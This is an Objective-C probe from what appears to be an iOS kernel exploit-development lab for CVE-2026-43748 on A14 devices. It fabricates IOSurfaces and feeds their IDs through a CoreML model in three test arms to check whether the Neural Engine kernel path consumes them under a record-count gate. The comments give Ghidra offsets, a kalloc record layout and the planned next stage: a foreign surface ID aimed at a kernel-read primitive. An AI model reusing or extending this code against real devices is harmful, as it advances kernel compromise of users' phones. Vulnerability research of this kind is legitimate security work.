//
//  P074AneConsume.m
//  P007OpenOnly — CVE-2026-43748 consume probe (count-gate pass, v3).
//
//  v2 lesson (2026-10-09 12:25): control arm x_126=0x7FFFFFFF predicted OK
//  with y=inf. fp16 (cpu-fp16 device) turns 2147483647 into inf, so the
//  compute read the VALUES — but an OK on a never-existing sid also fits
//  "kernel attempt aborted on lookup failure -> CoreML silently fell back
//  to CPU". And the espresso nets are BYTE-IDENTICAL between our local
//  coremlc 254-in compile and the shipped kernel-reaching XVRC27 bundle
//  (after generated-name normalization), so the compile is NOT the lever.
//
//  Unified hypothesis v3 tests:
//    H1  127-in attempts the kernel path on every predict. Real sids ->
//        count==128 passes the gate, lookups succeed, records consumed.
//        Compute reads STAGING values (v1: y == sid-value sum), not the
//        sid-wired DMA surfaces. Bogus sid -> lookup aborts -> CoreML
//        CPU fallback -> y=inf (v2 control).
//    H2  127-in is pure CPU (no kernel round trip at all).
//  Discriminator: TIMING + compute units. cpuOnly = pure CPU baseline.
//  All (real sids) = kernel attempt + submit; if H1, t(All) >> t(cpuOnly)
//  by the kernel round trip. All (bogus) = abort + fallback; if H1,
//  t(bogus) also carries the kernel round trip and y=inf.
//
//  Arms (fresh (sid,symbolIndex) pairs per arm — cache key includes the
//  symbol index; windows never overlap):
//    A. model_cpu (cpuOnly)  x_i = sids[0..126]           -> baseline y/t
//    B. model_all (All)      x_i = sids[127..253]         -> y/t, y oracle:
//         y == staging sum  -> kernel consumed, compute read staging (H1)
//         y == surface sum  -> ANE read OUR surface bytes = consume PROVEN
//    C. model_all (All)      x_126 = bogus (sids[254..379] + bogus) -> y/t
//         OK  y=inf  -> kernel aborted on lookup, CPU fallback (H1)
//         FAIL       -> no fallback at this failure point (still H1)
//         OK y=tiny  -> no kernel attempt (H2)
//
//  Mechanism ref (Ghidra @ 0x874c070 / 0x870d500, 23F77): CheckandPrewire
//  fills {u32 sid, u32 symbol, u64 0x100000001} records into kalloc.3072,
//  count = NOT-CACHED resources; MemoryMapRequest errors 0xe00002c2 when
//  0x80 < count. 127 records = 0x7F0 < 0xC00 in-bounds — no overflow, no
//  fuse possible on any arm. Cache key = (programHandle, sid, symbolIndex).
//
//  Honesty: consuming OUR OWN surfaces is legitimate ANE operation. The bar
//  (desc_type_forged OR (body_forged AND kptr)) is untouched. Stage B (one
//  FOREIGN sid among 126 own) is gated on the M2Scaler KVA leak — NOT this
//  tap. hasKread=NO.
//
//  Isolation: ONE TAP per force-quit. Per-line POSIX write + F_FULLFSYNC.
//

#import "P074AneConsume.h"
#import "LabDeviceProfile.h"
#import "LabLocalTime.h"
#import "P007Board.h"

#import <CoreML/CoreML.h>
#import <dlfcn.h>
#import <fcntl.h>
#import <mach/mach.h>
#import <math.h>
#import <string.h>
#import <unistd.h>

#define P074_BUILD @"p074-consume-v4-probeopen"

#define P074_MAX_REC     127u          /* gate is 0x80; 128-in failed twice */
#define P074_REC_BYTES   (P074_MAX_REC * 0x10u)   /* 0x7F0 < 0xC00 in-bounds */
#define P074_N_ARMS      3u
#define P074_N_SURF      (P074_MAX_REC * P074_N_ARMS + 4u)  /* 385 */

#define P074_MODEL_127   @"XVRC27_127in_1out"
#define P074_BOGUS_SID   0x7FFFFFFFu   /* can never exist in the registry */

#define P074_SURF_MARK   0x53u
#define P074_MAX_LOG_SID 16u

typedef struct __IOSurface *IOSurfaceRef;
typedef IOSurfaceRef (*p074_iosCreate_t)(CFDictionaryRef);
typedef uint32_t (*p074_iosGetID_t)(IOSurfaceRef);
typedef void *(*p074_iosBase_t)(IOSurfaceRef);
typedef size_t (*p074_iosAllocSz_t)(IOSurfaceRef);
typedef kern_return_t (*p074_iosLock_t)(IOSurfaceRef, uint32_t, uint32_t *);

typedef struct {
    IOSurfaceRef surf;
    uint32_t     sid;
    size_t       allocSize;
} p074_surf_t;

static int g_p074_fd = -1;
static NSMutableString *g_p074_buf;

static void p074_log(NSString *fmt, ...) {
    va_list ap;
    va_start(ap, fmt);
    NSString *line = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    NSString *out = [line hasSuffix:@"\n"] ? line : [line stringByAppendingString:@"\n"];
    @synchronized ([P074AneConsume class]) {
        if (g_p074_buf) [g_p074_buf appendString:out];
        if (g_p074_fd >= 0) {
            const char *s = out.UTF8String;
            if (s) {
                write(g_p074_fd, s, strlen(s));
                fcntl(g_p074_fd, F_FULLFSYNC);   /* panic-surviving flush per line */
            }
        }
    }
}

#pragma mark - IOSurface helpers

static p074_iosCreate_t  s_iosCreate;
static p074_iosGetID_t   s_iosGetID;
static p074_iosBase_t    s_iosBase;
static p074_iosAllocSz_t s_iosAllocSz;
static p074_iosLock_t    s_iosLock;
static p074_iosLock_t    s_iosUnlock;

static BOOL p074_resolve_iosurface(void) {
    void *h = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
    if (!h) h = dlopen("/System/Library/PrivateFrameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
    if (!h) return NO;
    s_iosCreate  = (p074_iosCreate_t)dlsym(h, "IOSurfaceCreate");
    s_iosGetID   = (p074_iosGetID_t)dlsym(h, "IOSurfaceGetID");
    s_iosBase    = (p074_iosBase_t)dlsym(h, "IOSurfaceGetBaseAddress");
    s_iosAllocSz = (p074_iosAllocSz_t)dlsym(h, "IOSurfaceGetAllocSize");
    s_iosLock    = (p074_iosLock_t)dlsym(h, "IOSurfaceLock");
    s_iosUnlock  = (p074_iosLock_t)dlsym(h, "IOSurfaceUnlock");
    return s_iosCreate && s_iosGetID && s_iosBase && s_iosAllocSz && s_iosLock && s_iosUnlock;
}

static CFNumberRef p074_cfnum(uint64_t v) {
    return CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt64Type, &v);
}

/* 1x1 BGRA: 4 payload bytes == declared fp32 [1,1,1,1] plane size */
static IOSurfaceRef p074_surface_create(void) {
    CFNumberRef w = p074_cfnum(1), h = p074_cfnum(1);
    CFNumberRef bpe = p074_cfnum(4), fmt = p074_cfnum(0x42475241); /* BGRA */
    const void *keys[] = { CFSTR("IOSurfaceWidth"), CFSTR("IOSurfaceHeight"),
                           CFSTR("IOSurfaceBytesPerElement"), CFSTR("IOSurfacePixelFormat") };
    const void *vals[] = { w, h, bpe, fmt };
    CFDictionaryRef props = CFDictionaryCreate(kCFAllocatorDefault, keys, vals, 4,
                                               &kCFTypeDictionaryKeyCallBacks,
                                               &kCFTypeDictionaryValueCallBacks);
    CFRelease(w); CFRelease(h); CFRelease(bpe); CFRelease(fmt);
    if (!props) return NULL;
    IOSurfaceRef s = s_iosCreate(props);
    CFRelease(props);
    return s;
}

static uint32_t p074_surfaces_fill(p074_surf_t *arr, uint32_t n) {
    uint32_t ok = 0;
    for (uint32_t i = 0; i < n; i++) {
        IOSurfaceRef s = p074_surface_create();
        if (!s) { p074_log(@"  surf[%u] create FAILED", i); continue; }
        arr[ok].surf = s;
        arr[ok].sid = s_iosGetID(s);
        arr[ok].allocSize = s_iosAllocSz(s);
        void *base = s_iosBase(s);
        if (base && arr[ok].allocSize > 0 && arr[ok].allocSize <= (16UL << 20)) {
            if (s_iosLock(s, 0, NULL) == KERN_SUCCESS) {
                memset(base, P074_SURF_MARK, arr[ok].allocSize);
                s_iosUnlock(s, 0, NULL);
            }
        }
        ok++;
    }
    return ok;
}

/* scan surfaces [first, first+n) for marker diffs (DMA write oracle) */
static uint32_t p074_surfaces_scan(p074_surf_t *arr, uint32_t first, uint32_t n) {
    uint32_t touched = 0;
    for (uint32_t i = first; i < first + n; i++) {
        if (!arr[i].surf) continue;
        void *base = s_iosBase(arr[i].surf);
        if (!base) continue;
        size_t sz = arr[i].allocSize;
        if (sz == 0 || sz > (16UL << 20)) continue;
        uint32_t diff = 0;
        if (s_iosLock(arr[i].surf, 0, NULL) != KERN_SUCCESS) continue;
        const uint8_t *b = (const uint8_t *)base;
        for (size_t k = 0; k < sz; k++) {
            if (b[k] != P074_SURF_MARK) { diff++; if (diff >= 64) break; }
        }
        s_iosUnlock(arr[i].surf, 0, NULL);
        if (diff) {
            touched++;
            p074_log(@"  [+] SURFACE TOUCHED sid=%u idx=%u diff>=%u (DMA write?)",
                     arr[i].sid, i, diff);
            [[P007Board shared] recordEvent:@"p074_surface_touched"
                                       kind:@"consume"
                                     detail:[NSString stringWithFormat:@"sid=%u idx=%u",
                                             arr[i].sid, i]
                                     source:@"p074"];
        }
    }
    return touched;
}

/* sum of first-4-bytes-as-fp32 over surfaces [first, first+n) */
static double p074_expected_fp32(p074_surf_t *arr, uint32_t first, uint32_t n) {
    double sum = 0.0;
    for (uint32_t i = first; i < first + n; i++) {
        if (!arr[i].surf) continue;
        void *base = s_iosBase(arr[i].surf);
        if (!base) continue;
        float f = 0.0f;
        memcpy(&f, base, sizeof(f));
        sum += (double)f;
    }
    return sum;
}

/* sum of the sid VALUES over [first, first+n) — what CPU/staging would give */
static double p074_expected_sids(p074_surf_t *arr, uint32_t first, uint32_t n) {
    double sum = 0.0;
    for (uint32_t i = first; i < first + n; i++) sum += (double)arr[i].sid;
    return sum;
}

#pragma mark - CoreML

static NSURL *p074_model_url(NSString *name) {
    NSBundle *b = [NSBundle mainBundle];
    NSURL *u = [b URLForResource:name withExtension:@"mlmodelc"];
    if (u) return u;
    return [b URLForResource:name withExtension:@"mlpackage"];
}

static MLModel *p074_load(NSURL *modelURL, MLComputeUnits units, NSError **errOut) {
    MLModelConfiguration *cfg = [[MLModelConfiguration alloc] init];
    cfg.computeUnits = units;
    return [MLModel modelWithContentsOfURL:modelURL configuration:cfg error:errOut];
}

/*
 * Feature provider for one arm. Values = sid VALUES over surfaces
 * [first, first+n), except the LAST slot when bogus=YES (never-existing sid).
 */
static MLDictionaryFeatureProvider *p074_provider(p074_surf_t *surfs, uint32_t nSurf,
                                                  uint32_t first, BOOL bogus,
                                                  NSError **errOut) {
    NSMutableDictionary *features = [NSMutableDictionary dictionary];
    for (uint32_t i = 0; i < P074_MAX_REC; i++) {
        MLMultiArray *arr = [[MLMultiArray alloc] initWithShape:@[ @1 ]
                                                       dataType:MLMultiArrayDataTypeDouble
                                                          error:nil];
        if (!arr) return nil;
        double val;
        if (bogus && i == P074_MAX_REC - 1) {
            val = (double)P074_BOGUS_SID;
        } else {
            uint32_t si = first + i;
            if (si >= nSurf) return nil;
            val = (double)surfs[si].sid;
        }
        arr[0] = @(val);
        features[[NSString stringWithFormat:@"x_%03u", i]] =
            [MLFeatureValue featureValueWithMultiArray:arr];
    }
    return [[MLDictionaryFeatureProvider alloc] initWithDictionary:features error:errOut];
}

/* predict; returns y or NAN; logs y/t */
static double p074_predict(MLModel *model, MLDictionaryFeatureProvider *fp,
                           NSError **errOut) {
    CFAbsoluteTime t0 = CFAbsoluteTimeGetCurrent();
    id<MLFeatureProvider> pred = [model predictionFromFeatures:fp error:errOut];
    CFAbsoluteTime t1 = CFAbsoluteTimeGetCurrent();
    double y = NAN;
    if (pred) {
        MLFeatureValue *yv = [pred featureValueForName:@"y"];
        MLMultiArray *ya = yv.multiArrayValue;
        y = ya ? ya[0].doubleValue : NAN;
    }
    if (y == y) {
        p074_log(@"    predict OK   t=%.1fms y=%.6e", (t1 - t0) * 1000.0, y);
    } else {
        p074_log(@"    predict FAIL t=%.1fms %@ (%@ / %ld)",
                 (t1 - t0) * 1000.0, (*errOut).localizedDescription ?: @"-",
                 (*errOut).domain ?: @"-", (long)(*errOut).code);
    }
    return y;
}

@implementation P074AneConsume

+ (NSString *)tap {
    g_p074_buf = [NSMutableString string];
    NSString *docs = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
    NSString *path = [docs stringByAppendingPathComponent:@"p074_ane_consume_log.txt"];
    g_p074_fd = open(path.fileSystemRepresentation, O_CREAT | O_WRONLY | O_TRUNC, 0644);

    p074_log(@"=== p074 session %@ BUILD %@ ===", LabLocalMilitaryNow(), P074_BUILD);
    p074_log(@"43748 consume v3: compute-units timing discriminator on the 127-in model.");
    p074_log(@"H1: kernel attempted every predict (real sids consume; bogus aborts -> CPU");
    p074_log(@"    fallback, v2's y=inf). H2: pure CPU, no kernel round trip.");
    p074_log(@"Arms: A cpuOnly-real (baseline) | B All-real (y oracle) | C All-bogus (fallback).");
    p074_log(@"Fresh (sid,symbolIndex) windows per arm — cache key includes the symbol index.");
    p074_log(@"%@", [P007Board shared].kreadSignal);

    NSString *stop = [LabDeviceProfile stopUnlessA14_23F77:@"p074"];
    if (stop) {
        p074_log(@"%@", stop);
        if (g_p074_fd >= 0) { fcntl(g_p074_fd, F_FULLFSYNC); close(g_p074_fd); g_p074_fd = -1; }
        NSString *ret = g_p074_buf; g_p074_buf = nil; return ret;
    }
    p074_log(@"%@", [LabDeviceProfile identBlock]);

    {
        const LabOffTab *off = LabOff();
        if (off && off->ane_fill_cap) {
            p074_log(@"EXPECT-BAD fill_cap=1. Consume geometry is A14 0x820. Probe still fires.");
        } else if (off && off->ane_table_size && off->ane_table_size != 0x820u) {
            p074_log(@"EXPECT-BAD ane_table_size=0x%x (not A14 0x820). Probe still fires.",
                     off->ane_table_size);
        } else if (!off) {
            p074_log(@"EXPECT-BAD LabOff NULL. Probe still fires.");
        }
    }

    /* ---- surfaces: 3 windows x 127 (+ margin), marker 0x53 ---- */
    if (!p074_resolve_iosurface()) {
        p074_log(@"[-] IOSurface dlsym FAILED — abort");
        p074_log(@"=== VERDICT === abort (iosurface). hasKread=NO.");
        if (g_p074_fd >= 0) { fcntl(g_p074_fd, F_FULLFSYNC); close(g_p074_fd); g_p074_fd = -1; }
        NSString *ret = g_p074_buf; g_p074_buf = nil; return ret;
    }
    p074_surf_t *surfs = calloc(P074_N_SURF, sizeof(p074_surf_t));
    uint32_t nSurf = p074_surfaces_fill(surfs, P074_N_SURF);
    p074_log(@"[+] fresh surfaces: %u/%u created (1x1 BGRA, marker 0x%02x, 3 arms x %u)",
             nSurf, P074_N_SURF, P074_SURF_MARK, P074_MAX_REC);
    if (nSurf > 0) {
        p074_log(@"  surf[0] sid=%u allocSize=%zu (size gate inputs — plane declared 4 bytes)",
                 surfs[0].sid, surfs[0].allocSize);
    }
    if (nSurf < P074_MAX_REC * P074_N_ARMS) {
        p074_log(@"[-] only %u surfaces — need %u (3 arms x %u)",
                 nSurf, P074_MAX_REC * P074_N_ARMS, P074_MAX_REC);
        p074_log(@"=== VERDICT === abort (surfaces). hasKread=NO.");
        for (uint32_t i = 0; i < nSurf; i++) if (surfs[i].surf) CFRelease(surfs[i].surf);
        free(surfs);
        if (g_p074_fd >= 0) { fcntl(g_p074_fd, F_FULLFSYNC); close(g_p074_fd); g_p074_fd = -1; }
        NSString *ret = g_p074_buf; g_p074_buf = nil; return ret;
    }
    {
        NSMutableString *idline = [NSMutableString stringWithString:@"  sids:"];
        for (uint32_t i = 0; i < P074_MAX_LOG_SID; i++)
            [idline appendFormat:@" %u", surfs[i].sid];
        [idline appendFormat:@" ... (%u total)", nSurf];
        p074_log(@"%@", idline);
    }

    /* ---- models: two instances of the same bundle ---- */
    NSURL *url = p074_model_url(P074_MODEL_127);
    if (!url) {
        p074_log(@"[-] model missing: %@", P074_MODEL_127);
        p074_log(@"=== VERDICT === abort (no model). hasKread=NO.");
        for (uint32_t i = 0; i < nSurf; i++) if (surfs[i].surf) CFRelease(surfs[i].surf);
        free(surfs);
        if (g_p074_fd >= 0) { fcntl(g_p074_fd, F_FULLFSYNC); close(g_p074_fd); g_p074_fd = -1; }
        NSString *ret = g_p074_buf; g_p074_buf = nil; return ret;
    }
    NSError *err = nil;
    MLModel *modelCPU = p074_load(url, MLComputeUnitsCPUOnly, &err);
    if (!modelCPU) {
        p074_log(@"[-] cpuOnly load FAILED: %@", err.localizedDescription ?: @"-");
    }
    MLModel *modelAll = p074_load(url, MLComputeUnitsAll, &err);
    if (!modelAll) {
        p074_log(@"[-] All load FAILED: %@", err.localizedDescription ?: @"-");
    }
    if (!modelCPU || !modelAll) {
        p074_log(@"=== VERDICT === abort (load). hasKread=NO.");
        for (uint32_t i = 0; i < nSurf; i++) if (surfs[i].surf) CFRelease(surfs[i].surf);
        free(surfs);
        if (g_p074_fd >= 0) { fcntl(g_p074_fd, F_FULLFSYNC); close(g_p074_fd); g_p074_fd = -1; }
        NSString *ret = g_p074_buf; g_p074_buf = nil; return ret;
    }
    p074_log(@"[+] %@ loaded x2 (cpuOnly + All)", P074_MODEL_127);

    /* ================= ARM A: cpuOnly, real sids (baseline) ================= */
    p074_log(@">>> ARM A: cpuOnly, x_i = sids[%u..%u] (pure CPU baseline)",
             0u, P074_MAX_REC - 1);
    double cpuY = NAN, cpuT = -1;
    {
        NSError *aErr = nil;
        MLDictionaryFeatureProvider *fp = p074_provider(surfs, nSurf, 0, NO, &aErr);
        if (!fp) {
            p074_log(@"[-] A provider FAILED: %@", aErr.localizedDescription ?: @"-");
        } else {
            CFAbsoluteTime t0 = CFAbsoluteTimeGetCurrent();
            cpuY = p074_predict(modelCPU, fp, &aErr);
            cpuT = CFAbsoluteTimeGetCurrent() - t0;
        }
    }

    /* ================= ARM B: All, real sids (y oracle) ================= */
    p074_log(@">>> ARM B: All, x_i = sids[%u..%u] (kernel attempt; y oracle)",
             P074_MAX_REC, 2 * P074_MAX_REC - 1);
    double bY = NAN; NSTimeInterval bT = -1;
    double bStaging = p074_expected_sids(surfs, P074_MAX_REC, P074_MAX_REC);
    double bSurf = p074_expected_fp32(surfs, P074_MAX_REC, P074_MAX_REC);
    p074_log(@"    hypotheses: staging=%.6e  surface-bytes=%.6e", bStaging, bSurf);
    BOOL consume = NO;
    {
        NSError *bErr = nil;
        MLDictionaryFeatureProvider *fp = p074_provider(surfs, nSurf, P074_MAX_REC, NO, &bErr);
        if (!fp) {
            p074_log(@"[-] B provider FAILED: %@", bErr.localizedDescription ?: @"-");
        } else {
            CFAbsoluteTime t0 = CFAbsoluteTimeGetCurrent();
            bY = p074_predict(modelAll, fp, &bErr);
            bT = CFAbsoluteTimeGetCurrent() - t0;
            if (bY == bY) {
                if (bSurf != 0.0 && fabs(bY - bSurf) / fabs(bSurf) < 0.01) {
                    p074_log(@"[!!!] y == surface-byte sum — ANE READ OUR IOSurface BYTES.");
                    p074_log(@"[!!!] Consume end-to-end PROVEN through the gate-passing request.");
                    consume = YES;
                } else if (fabs(bY - bStaging) < 1.0) {
                    p074_log(@"[+] y == staged-value sum — consistent with H1 (kernel consumed,");
                    p074_log(@"[+] compute read staging) OR H2 (pure CPU). Timing decides.");
                } else {
                    p074_log(@"[!] y matches neither hypothesis — dump for Ghidra review.");
                }
            }
        }
    }

    /* ================= ARM C: All, bogus sid (fallback detector) ================= */
    p074_log(@">>> ARM C: All, sids[%u..%u] + x_126 = 0x%08x bogus (fallback detector)",
             2 * P074_MAX_REC, 3 * P074_MAX_REC - 2, P074_BOGUS_SID);
    double cY = NAN; NSTimeInterval cT = -1;
    {
        NSError *cErr = nil;
        MLDictionaryFeatureProvider *fp = p074_provider(surfs, nSurf,
                                                        2 * P074_MAX_REC, YES, &cErr);
        if (!fp) {
            p074_log(@"[-] C provider FAILED: %@", cErr.localizedDescription ?: @"-");
        } else {
            CFAbsoluteTime t0 = CFAbsoluteTimeGetCurrent();
            cY = p074_predict(modelAll, fp, &cErr);
            cT = CFAbsoluteTimeGetCurrent() - t0;
        }
    }

    /* ---- timing analysis ---- */
    p074_log(@"[*] timing: cpuOnly=%.1fms  All-real=%.1fms  All-bogus=%.1fms",
             cpuT * 1000.0, bT * 1000.0, cT * 1000.0);
    if (cpuT > 0 && bT > 0) {
        double dB = (bT - cpuT) * 1000.0;
        p074_log(@"[*] All-real minus cpuOnly baseline: %+.1fms (kernel submit+DMA if H1)", dB);
    }
    if (cpuT > 0 && cT > 0) {
        double dC = (cT - cpuT) * 1000.0;
        p074_log(@"[*] All-bogus minus cpuOnly baseline: %+.1fms (abort+fallback if H1)", dC);
    }

    /* ---- marker scan (DMA write oracle) over all armed surfaces ---- */
    uint32_t touched = p074_surfaces_scan(surfs, 0, nSurf);
    p074_log(@"[D1] surface scan: %u touched of %u", touched, nSurf);

    /* ---- verdict ---- */
    p074_log(@"=== VERDICT ===");
    if (consume) {
        p074_log(@"consume PROVEN: ANE read our IOSurface bytes through the count-gate-passing");
        p074_log(@"request (arm B y == surface sum). Zero overflow (0x7F0 < 0xC00). NEXT:");
        p074_log(@"Stage B — one FOREIGN sid (M2Scaler KVA candidate) among 126 own sids.");
        [[P007Board shared] recordEvent:@"p074_session" kind:@"consume"
                                 detail:@"arm B y == surface bytes" source:@"p074"];
    } else if (bY == bY && fabs(bY - bStaging) < 1.0) {
        p074_log(@"y == staging sum on arm B. Kernel-attempt evidence:");
        if (isinf(cY)) {
            p074_log(@"  arm C OK with y=inf -> bogus sid reached the compute as a value:");
            p074_log(@"  kernel aborted on lookup + CPU fallback (H1) or pure CPU fp16 (H2).");
        } else if (cY != cY) {
            p074_log(@"  arm C FAILED -> no CPU fallback at this failure point; the kernel");
            p074_log(@"  abort surfaced as an error — strong H1 evidence.");
        } else {
            p074_log(@"  arm C OK with finite y=%.6e — bogus sid passed through as a value;", cY);
            p074_log(@"  inconsistent with H1 fallback shape — review.");
        }
        p074_log(@"  Deciding evidence is the timing block above: All-real and All-bogus");
        p074_log(@"  carry the kernel round trip only under H1 (delta vs cpuOnly >> 0).");
        p074_log(@"  Delta ~ 0 on both = H2 (pure CPU; kernel never attempted).");
        p074_log(@"Conversion bar (desc_type_forged OR (body_forged AND kptr)) untouched. hasKread=NO.");
        [[P007Board shared] recordEvent:@"p074_session" kind:@"staging_read"
                                 detail:@"y==staging sum; timing decides H1/H2" source:@"p074"];
    } else {
        p074_log(@"Unexpected arm-B result — see y and hypotheses above. hasKread=NO.");
        [[P007Board shared] recordEvent:@"p074_session" kind:@"unexpected"
                                 detail:@"arm B y matched neither hypothesis" source:@"p074"];
    }
    p074_log(@"One TAP per force-quit. Fresh surfaces next tap; arms never reuse a");
    p074_log(@"consumed (sid,symbolIndex) pair.");

    for (uint32_t i = 0; i < nSurf; i++) if (surfs[i].surf) CFRelease(surfs[i].surf);
    free(surfs);

    if (g_p074_fd >= 0) { fcntl(g_p074_fd, F_FULLFSYNC); close(g_p074_fd); g_p074_fd = -1; }
    NSString *ret = g_p074_buf;
    g_p074_buf = nil;
    return ret;
}

@end